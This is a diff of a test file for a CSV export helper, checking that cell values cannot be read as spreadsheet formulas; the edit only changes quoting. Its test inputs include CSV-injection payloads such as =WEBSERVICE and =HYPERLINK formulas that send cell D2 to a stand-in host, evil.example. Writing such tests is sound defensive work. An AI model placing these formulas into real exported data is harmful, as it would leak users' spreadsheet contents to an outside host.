@@ -141,7 +141,7 @@ describe("links", () => {
   });
 
   it("never lets a spreadsheet read a cell as a formula", () => {
-    for (const hostile of ["=HYPERLINK(\"https://evil.example\";D2)", "+1+1", "-2+3", "@SUM(A1)", "\tx", "\rx"]) {
+    for (const hostile of ['=HYPERLINK("https://evil.example";D2)', "+1+1", "-2+3", "@SUM(A1)", "\tx", "\rx"]) {
       const out = csvCell(hostile);
       expect(out.startsWith(`"'`)).toBe(true);
       expect(out.endsWith('"')).toBe(true);
@@ -154,7 +154,7 @@ describe("links", () => {
         {
           mailboxId: 1,
           address: "=cmd@example.com",
-          name: "=WEBSERVICE(\"https://evil.example/\"&D2)",
+          name: '=WEBSERVICE("https://evil.example/"&D2)',
           oldAddress: "+old@example.net",
           path: "/password/abc",
           expiresAt: 0,
